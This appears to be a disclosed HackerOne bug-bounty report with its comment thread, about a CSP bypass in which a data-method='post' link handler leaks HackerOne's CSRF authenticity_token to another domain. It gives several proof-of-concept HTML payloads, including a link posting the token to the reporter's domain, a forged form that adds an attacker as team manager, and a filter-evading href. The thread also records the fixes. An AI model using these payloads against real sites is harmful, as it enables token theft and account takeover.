{"id":47472,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzQ3Mg==","url":"https://hackerone.com/reports/47472","title":"CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-02-11T20:03:01.597Z","submitted_at":"2015-02-11T20:03:01.597Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"danlec","url":"/danlec","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-02-26T21:50:46.056Z","bug_reporter_agreed_on_going_public_at":"2015-02-26T21:50:45.257Z","team_member_agreed_on_going_public_at":"2015-02-26T21:44:10.626Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Background**\r\n\r\n- There has been [at least one case](/reports/46072) where [an attacker](/danlec) was able to insert arbitrary HTML into a submitted report\r\n- HackerOne uses a very strict Content Security Policy that prevents inline script and script from other origins\r\n- HackerOne uses an `authenticity_token` in its POSTs to guard against CSRF attacks\r\n- There is a click handler for links with a`data-method` attribute that makes it so an `\u003ca\u003e` tag with a `data-method=\"post\"` will send the CSRF token in a POST to the `href` of the link, **even if the target is a different origin**\r\n\r\n**Proof of concept**\r\n\r\n1.  Suppose that someone is able to find an exploit similar to #46072, allowing them to insert arbitrary HTML into a report, and they insert the following payload:\r\n```\r\n\u003ca href=\"http://danlec.com\" data-method=\"post\"\u003eProof of Concept\u003c/a\u003e\r\n```\r\n  Since I'm not currently aware of a means of doing this, we'll have to simulate this by running the following from the console:\r\n```\r\n$(\".hacktivity-container-content:first\")\r\n .html('\u003cp\u003e\u003ca href=\"http://danlec.com\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\u003c/p\u003e')\r\n```\r\n  (Yes, in general security reports involving the victim running code on the console are highly suspect.  Please bear with me.)\r\n\r\n2.  When the victim clicks the link, the current `authenticity_token` is sent to \u003chttp://danlec.com\u003e.  You can inspect the headers that are sent, or have the link be \u003chttp://httpbin.org/post\u003e which will echo the headers that it was sent.\r\n\r\n3.  Using the `authenticity_token` it was provided, the target of the link could automatically submit a form like the following on the victim's behalf:\r\n```\r\n\u003cform method=\"POST\" action=\"https://hackerone.com/danlec-test/team_members\"\r\n     target=\"_blank\"\u003e\r\n  \u003cinput type=\"text\" name=\"authenticity_token\" \r\n     value=\"authenticity_token from the POST to this page\"\u003e\r\n  \u003cinput type=\"text\" name=\"invitations_team_member[email]\" \r\n     value=\"attacker@gmail.com\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"team_member[add_as_manager]\" value=\"1\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"utf8\" value=\"✓\"\u003e\r\n  \u003cinput type=\"hidden\" name=\"commit\" value=\"Send invite\"\u003e\r\n  \u003cinput type=\"submit\"\u003e\r\n\u003c/form\u003e\r\n```\r\n\r\nIt would make sense if the click handler for links with a `data-method` attribute only ran for links to URLs with the same origin, especially in situations warranting a strict Content Security Policy.\r\n\r\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-03-28T21:44:16.580Z","allow_singular_disclosure_after":-206385572.91788444,"singular_disclosure_allowed":true,"vote_count":7,"voters":["sw33tlie","ali","r3y","japz","eidelweiss","dyabla","5_6"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":330389,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Slick CSP bypass. We'll get this fixed, either by removing the behavior entirely or restricting it to internal domains. Resolution timeline might be a bit longer if we opt for the former route as we currently depend upon this behavior in a handful of areas and it doesn't seem to warrant an urgent fix. Thanks!","automated_response":false,"created_at":"2015-02-11T21:45:47.513Z","updated_at":"2015-02-11T21:45:47.513Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":330396,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great!  I just wish I'd thought of that **before** submitting #46072 because that would have been so much cooler :)","automated_response":false,"created_at":"2015-02-11T21:47:40.879Z","updated_at":"2015-02-11T21:47:40.879Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @danlec, \n\nWe have made a preliminary fix that changes the `data-method` binding outside of the `markdownable` area. So your original POC would still work, but if you inserted your link within the typical markdown area then our patch should apply.\n\nOur longer term fix is to whitelist the urls that are allowed to be sent the CSRF token. The patch we developed is currently up for review here: https://github.com/rails/jquery-ujs/pull/403\n\nIf you have a chance, can you confirm our interim fix and advise on our longer term fix?\n\nThanks again for the great report!","automated_response":false,"created_at":"2015-02-16T23:25:26.946Z","updated_at":"2015-02-16T23:25:26.946Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":333152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We just figured out that our temporary fix really only fixes your POC, but not any real HTML insertion use case, as the researcher would still be able to insert closing HTML tags to break out of our \"blacklisted\" selector. This is why we would like to wait for the real fix to be landed, before we close/disclose this diff.","automated_response":false,"created_at":"2015-02-16T23:53:54.865Z","updated_at":"2015-02-16T23:53:54.865Z","actor":{"username":"rso","cleared":false,"url":"/rso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/031/bad304b45f09b089c121de18c65d91d226f0aeea_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333203,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looking at that diff, it seems that the framework is still too trusting of the `href` on the link, and assumes that it can be concatenated to HTML without any escaping; it seems like you could set up a link like this:\n\n```\n\u003ca href=\"http://example.com?\u0026quot;\u003e\u003c/form\u003e\u003cform action=\u0026quot;http://danlec.com\u0026quot;\u003e\u003c\u0026quot;\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\n```\n\n… which appears to be enough to pass a simple `/example\\.com/.test(hostname)` check while still causing the form with the CSRF token to be submitted to a non-whitelisted domain.  \n\n(Now that I've got my code review hat on, maybe the test filters should be `/^localhost$/` and `/^rubyonrails\\.org$/` so nobody looking at those ends up with filters that could be defeated by `http://rubyonrailsxorglocalhost.com` or thinks they need to have an `http://` in there … unless you were wanting to check the `origin` instead of the `hostname`?)","automated_response":false,"created_at":"2015-02-17T06:00:14.276Z","updated_at":"2015-02-17T06:12:56.912Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":333821,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks again for the feedback, as usual that's another great attack string, I have updated the PR accordingly. Let us know if there is any additional feedback.\n\nWe're not sure if the PR will be inline with what the community wants, but plan on forking and using our own version in the meantime. Hopefully we can push this out shortly.\n\nThanks for your patience!","automated_response":false,"created_at":"2015-02-18T02:23:03.881Z","updated_at":"2015-02-18T02:23:03.881Z","actor":{"username":"bencode","cleared":false,"url":"/bencode","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/117/ddaa1da4e004e1234c6857c42f9bfa8df85b5ccf_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":333892,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay, the pull request looks safer now.\n\nIf it wasn't already clear, bear in mind that the current setup can **still** cause bad things to happen **without** going to another domain, e.g. with\n\n```\n\u003ca href=\"/danlec-test/team_members?invitations_team_member[email]=attacker@example.com\u0026team_member[add_as_manager]=1\u0026commit=Send+Invite\" data-method=\"post\"\u003eClick Me!\u003c/a\u003e\n```\n\n… since the routes appear to let you have some of the parameters in the query string, you don't need to be able to construct a form to POST.\n\n","automated_response":false,"created_at":"2015-02-18T06:50:11.403Z","updated_at":"2015-02-18T06:50:11.403Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341023,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like you're going with the \"removing the behavior entirely\" approach, which appears to be the only safe option.","automated_response":false,"created_at":"2015-02-26T18:57:00.930Z","updated_at":"2015-02-26T19:01:25.509Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341212,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hehe, yeah, this took a while to get right, but in the end just disabling it was probably the best option. \n\nFor the record, this is what we did:\n\nI've monkeypatched the `rails-ujs` `$.rails.handleMethod` method, like this:\n\n```coffeescript\n$.rails.handleMethod = -\u003e throw \"nope\"\n```\n\nAnd replaced all uses of `data-method` in our codebase with a custom helper, that actually generates the following html:\n\n```html\n\u003cform action=\"https://hackerone.com/url\" method=\"post\"\u003e\n  \u003c!-- csrf stuff --\u003e\n  \u003cbutton type=\"submit\" class=\"im-a-link\"\u003eRemote link\u003c/submit\u003e\n\u003c/form\u003e\n```\n\nAn attacker can not insert this HTML through an XSS because of the CSRF stuff.\n\nEventually we want to replace all these use cases with clean CoffeeScript/React code, but that would've taken a lot longer to implement.\n\nIf you think that this fix was not sufficient, please let me know!","automated_response":false,"created_at":"2015-02-26T20:30:58.243Z","updated_at":"2015-02-26T20:30:58.243Z","actor":{"username":"rso","cleared":false,"url":"/rso","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/031/bad304b45f09b089c121de18c65d91d226f0aeea_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"danlec","url":"/danlec"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341239,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yeah, I scoped it out when I saw you made the change (…and was wondering if you'd used some kind of helper to generate the forms!) and this should be sufficient … assuming there aren't **other** dangerous global helpers of course :)\n\nDo you think this is interesting enough to warrant public disclosure?","automated_response":false,"created_at":"2015-02-26T21:10:33.175Z","updated_at":"2015-02-26T21:17:10.861Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341275,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2015-02-26T21:43:57.679Z","updated_at":"2015-02-26T21:43:57.679Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"HackerOne"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"danlec","url":"/danlec"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341276,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-02-26T21:44:15.507Z","updated_at":"2015-02-26T21:44:15.507Z","first_to_agree":true,"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341277,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2015-02-26T21:44:46.292Z","updated_at":"2015-02-26T21:44:46.292Z","additional_data":{"old_title":"Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain","new_title":"CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain"},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":341281,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-02-26T21:50:45.304Z","updated_at":"2015-02-26T21:50:45.304Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":341282,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-02-26T21:50:46.125Z","updated_at":"2015-02-26T21:50:46.125Z","actor":{"username":"danlec","cleared":false,"url":"/danlec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/404/1fb35d139fbfcb566e2513ca6c92f2dfe6cde541_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}